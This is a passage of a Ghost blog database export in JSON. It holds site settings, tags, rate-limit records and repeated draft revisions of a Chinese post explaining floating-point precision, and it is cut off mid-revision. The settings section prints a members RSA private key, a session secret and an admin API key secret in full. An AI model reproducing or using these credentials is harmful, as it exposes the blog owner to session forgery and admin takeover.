15:58:41"},{"id":"5cfa0630c6743100012793d5","key":"amp","value":"true","type":"blog","created_at":"2017-06-30 02:32:13","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793d6","key":"ghost_head","value":null,"type":"blog","created_at":"2015-03-11 06:16:10","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793d7","key":"ghost_foot","value":"<!-- You can safely delete this line if your theme does not require jQuery -->\n<script type=\"text/javascript\" src=\"https://code.jquery.com/jquery-1.11.3.min.js\"></script>\n\n","type":"blog","created_at":"2015-03-11 06:16:10","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793d8","key":"facebook","value":"chenxiaojing","type":"blog","created_at":"2017-01-10 03:14:58","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793d9","key":"twitter","value":"@chxj1992","type":"blog","created_at":"2017-01-10 03:14:58","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793da","key":"labs","value":"{\"codeInjectionUI\":false,\"publicAPI\":true}","type":"blog","created_at":"2015-03-11 06:16:10","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793db","key":"navigation","value":"[{\"label\":\"Home\",\"url\":\"http://blog.chxj.name/\"},{\"label\":\"GitHub\",\"url\":\"https://github.com/chxj1992\"},{\"label\":\"CodeWars\",\"url\":\"https://www.codewars.com/users/chxj1992\"},{\"label\":\"Resume\",\"url\":\"https://www.sharelatex.com/read/fqwxxyjsypsk\"}]","type":"blog","created_at":"2015-03-11 06:16:10","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793dc","key":"slack","value":"[{\"url\":\"\"}]","type":"blog","created_at":"2017-01-10 03:14:58","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793dd","key":"unsplash","value":"{\"isActive\": true}","type":"blog","created_at":"2019-06-07 06:37:36","updated_at":"2019-06-07 06:37:36"},{"id":"5cfa0630c6743100012793de","key":"active_theme","value":"attila-master","type":"theme","created_at":"2019-06-07 06:37:36","updated_at":"2019-06-07 06:39:27"},{"id":"5cfa0630c6743100012793df","key":"is_private","value":"false","type":"private","created_at":"2016-03-17 03:26:28","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793e0","key":"password","value":null,"type":"private","created_at":"2016-03-17 03:26:28","updated_at":"2018-10-30 15:58:41"},{"id":"5cfa0630c6743100012793e1","key":"public_hash","value":"97f17bd2f617203e0b8f25714870a7","type":"private","created_at":"2019-06-07 06:37:36","updated_at":"2019-06-07 06:37:36"},{"id":"5cfa0630c6743100012793e2","key":"members_public_key","value":"-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAL47QfvPrimjapOqgjhSLQdPAqZ4eYy0HlvVMD7GWP0i4tqN7/uiUHPZ6N04g6D8\nsrfTAoJTtsf5J5caG1GmjVO4GW4dlfhZI30DHF254DhqrZx6FKcqnrnZjjn+xc3FqIo3wqqE\nV3q2OPEAAIZc8F4O6fuPHlLTSitTjqGvYoWbAgMBAAE=\n-----END RSA PUBLIC KEY-----\n","type":"members","created_at":"2019-06-07 06:37:36","updated_at":"2019-06-07 06:37:36"},{"id":"5cfa0630c6743100012793e3","key":"members_private_key","value":"-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQC+O0H7z64po2qTqoI4Ui0HTwKmeHmMtB5b1TA+xlj9IuLaje/7olBz2ejd\nOIOg/LK30wKCU7bH+SeXGhtRpo1TuBluHZX4WSN9AxxdueA4aq2cehSnKp652Y45/sXNxaiK\nN8KqhFd6tjjxAACGXPBeDun7jx5S00orU46hr2KFmwIDAQABAoGBALO+giZQoZuuUTGd1tUo\nsGtLeJGbHB6awmS7F475E3R71iX0H2GAiMwuhh0hHR6sJqISuzgxqW9iOMpJXK7V1Io2Da6k\nPjC4K7eTnGU6o5RFvMXmlLhjLWCx1PCqxafQVP0H/hAVxVhiergvfGHFkRXKwHzlnqd43aUt\ndYauEM+hAkEA+f7wFQ3+Yzw9yIhr8ICOQMFXfJhilafqaElJB5CjTLPWyjLkAyeGbfB/g2mY\nFJeeyw9PIBbxEBB/JhetiotLfQJBAMLM3hoSpYyMUHqj2VmNHHl1bIPMvQAYnHsE3nIyIQnc\na3lbFxIXAig4/L9DEctztECi/zkF1uiPUpqHDz+ucPcCQQCmprQU1QdHz9i/3XFXGdu6fyh6\n/np5mT5B1tjAGkNB1oDQuawWDjsm/rOCPtoKoChS5RmyIpkARH7+PbqKKOFhAkEAhSNwSXGl\nJEJiXu/NhZ8kbv8Kg6pTItWvXYUeY/5PBmZYLkFLq1l+Z+9LD43Pg7Y45FSDC34qPBh45JSa\nn3OiUQJAEDAUlAx9cI9QSk0GTudsn5dy/FPjm4fQcQBRoBmijIEmFKSAVJ3eFfAo2H9KzpNs\nQVWcO6W8/eXxzcc1/U9/eQ==\n-----END RSA PRIVATE KEY-----\n","type":"members","created_at":"2019-06-07 06:37:36","updated_at":"2019-06-07 06:37:36"},{"id":"5cfa0630c6743100012793e4","key":"members_session_secret","value":"4a8e33fa0be3f93ee6a89e09e1bbcbfdbff1ce538a9e7f3f41fa200a70701e72","type":"members","created_at":"2019-06-07 06:37:36","updated_at":"2019-06-07 06:37:36"},{"id":"5cfa0630c6743100012793e5","key":"members_subscription_settings","value":"{\"isPaid\":false,\"paymentProcessors\":[{\"adapter\":\"stripe\",\"config\":{\"secret_token\":\"\",\"public_token\":\"\",\"product\":{\"name\":\"Ghost Subscription\"},\"plans\":[{\"name\":\"Monthly\",\"currency\":\"usd\",\"interval\":\"month\",\"amount\":\"\"},{\"name\":\"Yearly\",\"currency\":\"usd\",\"interval\":\"year\",\"amount\":\"\"}]}}]}","type":"members","created_at":"2019-06-07 06:37:36","updated_at":"2019-06-07 06:37:36"}],"tags":[{"id":"5cfa062bc674310001279296","name":"Getting Started","slug":"getting-started","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa089b31767300013e0e43","name":"php","slug":"php","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2013-12-19 04:25:44","updated_at":"2013-12-19 04:25:44"},{"id":"5cfa089b31767300013e0e44","name":"js","slug":"js","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2013-12-19 04:26:10","updated_at":"2013-12-19 04:26:10"},{"id":"5cfa089b31767300013e0e45","name":"life","slug":"life","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2013-12-22 08:11:51","updated_at":"2013-12-22 08:11:51"},{"id":"5cfa089b31767300013e0e46","name":"linux","slug":"linux","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2013-12-23 13:43:44","updated_at":"2013-12-23 13:43:44"},{"id":"5cfa089b31767300013e0e47","name":"test","slug":"test","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2016-02-11 05:51:43","updated_at":"2016-02-11 05:51:43"},{"id":"5cfa089b31767300013e0e48","name":"python","slug":"python","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2016-02-11 05:57:54","updated_at":"2016-02-11 05:57:54"},{"id":"5cfa089b31767300013e0e49","name":"security","slug":"security","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2016-02-11 06:01:13","updated_at":"2016-02-11 06:01:13"},{"id":"5cfa089b31767300013e0e4a","name":"ci","slug":"ci","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2016-02-11 06:03:32","updated_at":"2016-02-11 06:03:32"},{"id":"5cfa089b31767300013e0e4b","name":"database","slug":"database","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2016-02-12 07:21:05","updated_at":"2016-02-12 07:21:05"},{"id":"5cfa089b31767300013e0e4c","name":"直播","slug":"zhi-bo","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-03-12 07:10:01","updated_at":"2017-03-12 07:10:01"},{"id":"5cfa089b31767300013e0e4d","name":"web","slug":"web","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-03-12 07:10:01","updated_at":"2017-03-12 07:10:01"},{"id":"5cfa089b31767300013e0e4e","name":"rtmp","slug":"rtmp","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-03-12 07:10:01","updated_at":"2017-03-12 07:10:01"},{"id":"5cfa089b31767300013e0e4f","name":"逆波兰表达式","slug":"ni-bo-lan-biao-da-shi","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-08-24 08:09:41","updated_at":"2017-08-24 08:09:41"},{"id":"5cfa089b31767300013e0e50","name":"算法","slug":"suan-fa","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-08-24 08:09:41","updated_at":"2017-08-24 08:09:41"},{"id":"5cfa089b31767300013e0e51","name":"Reverse Polish notation","slug":"reverse-polish-notation","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-08-24 08:09:41","updated_at":"2017-08-24 08:09:41"},{"id":"5cfa089b31767300013e0e52","name":"algorithm","slug":"algorithm","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-08-24 08:09:41","updated_at":"2017-08-24 08:09:41"},{"id":"5cfa089b31767300013e0e53","name":"Three-Pass编译器","slug":"three-passbian-yi-qi","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-08-24 08:10:41","updated_at":"2017-08-24 08:10:41"},{"id":"5cfa089b31767300013e0e54","name":"rocketmq","slug":"rocketmq","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2019-03-20 03:21:44","updated_at":"2019-03-20 03:21:44"},{"id":"5e0067072ee0ee000181986d","name":"math","slug":"math","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2019-12-23 07:04:39","updated_at":"2019-12-23 07:04:39"},{"id":"5e0067072ee0ee000181986e","name":"ECC","slug":"ecc","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2019-12-23 07:04:39","updated_at":"2019-12-23 07:04:39"},{"id":"5e0067072ee0ee000181986f","name":"cryptography","slug":"cryptography","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2019-12-23 07:04:39","updated_at":"2019-12-23 07:04:39"}],"posts_tags":[{"id":"5cfa089b31767300013e0e8c","post_id":"5cfa089b31767300013e0e57","tag_id":"5cfa089b31767300013e0e4b","sort_order":0},{"id":"5cfa089b31767300013e0e8e","post_id":"5cfa089b31767300013e0e58","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089b31767300013e0e90","post_id":"5cfa089b31767300013e0e59","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089b31767300013e0e92","post_id":"5cfa089b31767300013e0e5a","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0e94","post_id":"5cfa089b31767300013e0e5b","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0e95","post_id":"5cfa089b31767300013e0e5b","tag_id":"5cfa089b31767300013e0e47","sort_order":1},{"id":"5cfa089c31767300013e0e97","post_id":"5cfa089b31767300013e0e5c","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0e99","post_id":"5cfa089b31767300013e0e5d","tag_id":"5cfa089b31767300013e0e44","sort_order":0},{"id":"5cfa089c31767300013e0e9b","post_id":"5cfa089b31767300013e0e5e","tag_id":"5cfa089b31767300013e0e44","sort_order":0},{"id":"5cfa089c31767300013e0e9d","post_id":"5cfa089b31767300013e0e5f","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0e9f","post_id":"5cfa089b31767300013e0e60","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0ea1","post_id":"5cfa089b31767300013e0e61","tag_id":"5cfa089b31767300013e0e49","sort_order":0},{"id":"5cfa089c31767300013e0ea2","post_id":"5cfa089b31767300013e0e61","tag_id":"5cfa089b31767300013e0e4b","sort_order":1},{"id":"5cfa089c31767300013e0ea4","post_id":"5cfa089b31767300013e0e62","tag_id":"5cfa089b31767300013e0e45","sort_order":0},{"id":"5cfa089c31767300013e0ea6","post_id":"5cfa089b31767300013e0e63","tag_id":"5cfa089b31767300013e0e46","sort_order":0},{"id":"5cfa089c31767300013e0eaa","post_id":"5cfa089b31767300013e0e65","tag_id":"5cfa089b31767300013e0e49","sort_order":0},{"id":"5cfa089c31767300013e0eab","post_id":"5cfa089b31767300013e0e65","tag_id":"5cfa089b31767300013e0e4b","sort_order":1},{"id":"5cfa089c31767300013e0ead","post_id":"5cfa089b31767300013e0e66","tag_id":"5cfa089b31767300013e0e48","sort_order":0},{"id":"5cfa089c31767300013e0eae","post_id":"5cfa089b31767300013e0e66","tag_id":"5cfa089b31767300013e0e49","sort_order":1},{"id":"5cfa089c31767300013e0eb2","post_id":"5cfa089b31767300013e0e68","tag_id":"5cfa089b31767300013e0e44","sort_order":0},{"id":"5cfa089c31767300013e0eb3","post_id":"5cfa089b31767300013e0e68","tag_id":"5cfa089b31767300013e0e47","sort_order":1},{"id":"5cfa089c31767300013e0eb5","post_id":"5cfa089b31767300013e0e69","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0eb6","post_id":"5cfa089b31767300013e0e69","tag_id":"5cfa089b31767300013e0e4a","sort_order":1},{"id":"5cfa089c31767300013e0eb8","post_id":"5cfa089b31767300013e0e6a","tag_id":"5cfa089b31767300013e0e46","sort_order":0},{"id":"5cfa089c31767300013e0eba","post_id":"5cfa089b31767300013e0e6b","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0ebc","post_id":"5cfa089b31767300013e0e6c","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0ebd","post_id":"5cfa089b31767300013e0e6c","tag_id":"5cfa089b31767300013e0e4b","sort_order":1},{"id":"5cfa089c31767300013e0ebf","post_id":"5cfa089b31767300013e0e6d","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0ec0","post_id":"5cfa089b31767300013e0e6d","tag_id":"5cfa089b31767300013e0e4a","sort_order":1},{"id":"5cfa089c31767300013e0ec2","post_id":"5cfa089b31767300013e0e6e","tag_id":"5cfa089b31767300013e0e47","sort_order":0},{"id":"5cfa089c31767300013e0ec4","post_id":"5cfa089b31767300013e0e6f","tag_id":"5cfa089b31767300013e0e46","sort_order":0},{"id":"5cfa089c31767300013e0ec6","post_id":"5cfa089b31767300013e0e70","tag_id":"5cfa089b31767300013e0e43","sort_order":0},{"id":"5cfa089c31767300013e0ec8","post_id":"5cfa089b31767300013e0e71","tag_id":"5cfa089b31767300013e0e4b","sort_order":0},{"id":"5cfa089d31767300013e0ed2","post_id":"5cfa089b31767300013e0e78","tag_id":"5cfa089b31767300013e0e4c","sort_order":0},{"id":"5cfa089d31767300013e0ed3","post_id":"5cfa089b31767300013e0e78","tag_id":"5cfa089b31767300013e0e4d","sort_order":1},{"id":"5cfa089d31767300013e0ed4","post_id":"5cfa089b31767300013e0e78","tag_id":"5cfa089b31767300013e0e4e","sort_order":2},{"id":"5cfa089d31767300013e0edb","post_id":"5cfa089b31767300013e0e7e","tag_id":"5cfa089b31767300013e0e50","sort_order":0},{"id":"5cfa089d31767300013e0edd","post_id":"5cfa089b31767300013e0e7f","tag_id":"5cfa089b31767300013e0e50","sort_order":0},{"id":"5cfa089d31767300013e0ee0","post_id":"5cfa089b31767300013e0e81","tag_id":"5cfa089b31767300013e0e52","sort_order":0},{"id":"5cfa089d31767300013e0ee8","post_id":"5cfa089b31767300013e0e88","tag_id":"5cfa089b31767300013e0e54","sort_order":0},{"id":"5d6bcc1a3faccd0001d04fbe","post_id":"5d6bcbeb3faccd0001d04fb6","tag_id":"5cfa089b31767300013e0e45","sort_order":0},{"id":"5d7bb54b3faccd0001d052d2","post_id":"5d7b12173faccd0001d04fc3","tag_id":"5cfa089b31767300013e0e52","sort_order":0},{"id":"5e0067072ee0ee0001819870","post_id":"5dfc7ca42ee0ee000181900e","tag_id":"5cfa089b31767300013e0e52","sort_order":0},{"id":"5e0067072ee0ee0001819874","post_id":"5dfc7ca42ee0ee000181900e","tag_id":"5e0067072ee0ee000181986f","sort_order":4},{"id":"5e0067072ee0ee0001819871","post_id":"5dfc7ca42ee0ee000181900e","tag_id":"5cfa089b31767300013e0e50","sort_order":1},{"id":"5e0067072ee0ee0001819872","post_id":"5dfc7ca42ee0ee000181900e","tag_id":"5e0067072ee0ee000181986d","sort_order":2},{"id":"5e0067072ee0ee0001819873","post_id":"5dfc7ca42ee0ee000181900e","tag_id":"5e0067072ee0ee000181986e","sort_order":3},{"id":"5e0067b52ee0ee0001819882","post_id":"5e0067842ee0ee000181987b","tag_id":"5cfa089b31767300013e0e52","sort_order":0},{"id":"5e0067b52ee0ee0001819883","post_id":"5e0067842ee0ee000181987b","tag_id":"5e0067072ee0ee000181986f","sort_order":1},{"id":"5e0067b52ee0ee0001819884","post_id":"5e0067842ee0ee000181987b","tag_id":"5e0067072ee0ee000181986e","sort_order":2},{"id":"5e0067b52ee0ee0001819885","post_id":"5e0067842ee0ee000181987b","tag_id":"5cfa089b31767300013e0e50","sort_order":3}],"apps":[],"app_settings":[],"app_fields":[],"subscribers":[],"invites":[],"brute":[{"key":"UXHTPedhvj7fg8B+I+hzCoK6pBQcx7bJBvD8qbVpMhc=","firstRequest":1574499957370,"lastRequest":1574500431084,"lifetime":1574504031087,"count":11},{"key":"pjGvPM5lGzENp9CYO2spHdd8JEmgw41X7jLSe8fWxvs=","firstRequest":1574499957398,"lastRequest":1574500003974,"lifetime":1587200803975,"count":5},{"key":"hjlNj+BX6z8EHV85mxqXhelmvUMVj5DK6+9Nf61JXTI=","firstRequest":1574499974438,"lastRequest":1574499974438,"lifetime":1574503574440,"count":1},{"key":"zArgk1y20WCFAXkEyDxuGme2wZVH2Idg8MR72SPdTdU=","firstRequest":1574499974446,"lastRequest":1574499974446,"lifetime":1574503574448,"count":1},{"key":"yYXTCf2fP1ZLA8QoLSt5S1FUZhssoqnwNTpweWE3pGg=","firstRequest":1574500922841,"lastRequest":1574500922841,"lifetime":1574504522852,"count":1}],"webhooks":[],"integrations":[{"id":"5cfa062dc6743100012792f6","type":"builtin","name":"Zapier","slug":"zapier","icon_image":null,"description":"Built-in Zapier integration","created_at":"2019-06-07 06:37:33","updated_at":"2019-06-07 06:37:33"}],"api_keys":[{"id":"5cfa062dc6743100012792f7","type":"admin","secret":"83c15e77bd1894bf78399d43f97ce1c1eb98acd433db63942815c59f14fb6631","role_id":"5cfa062bc6743100012792a0","integration_id":"5cfa062dc6743100012792f6","last_seen_at":null,"last_seen_version":null,"created_at":"2019-06-07 06:37:33","updated_at":"2019-06-07 06:37:33"}],"mobiledoc_revisions":[{"id":"5d6a74073faccd0001d04f27","post_id":"5d6a74073faccd0001d04f25","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","created_at_ts":1567257607706,"created_at":"2019-08-31 13:20:07"},{"id":"5d6bcad13faccd0001d04f9e","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`, 在这种表示方式下，当然也就不会有精度问题了\"}],[\"markdown\",{\"markdown\":\"* 参考文献: [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]]]}","created_at_ts":1567345360984,"created_at":"2019-09-01 13:42:41"},{"id":"5d6bcad73faccd0001d04fa0","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`, 这种表示方式下，当然也就不会有精度问题了\"}],[\"markdown\",{\"markdown\":\"* 参考文献: [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]]]}","created_at_ts":1567345366949,"created_at":"2019-09-01 13:42:47"},{"id":"5d6bcae93faccd0001d04fa2","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然也就不会有精度问题了\"}],[\"markdown\",{\"markdown\":\"* 参考文献: [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]]]}","created_at_ts":1567345385712,"created_at":"2019-09-01 13:43:05"},{"id":"5d6bcaf13faccd0001d04fa4","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 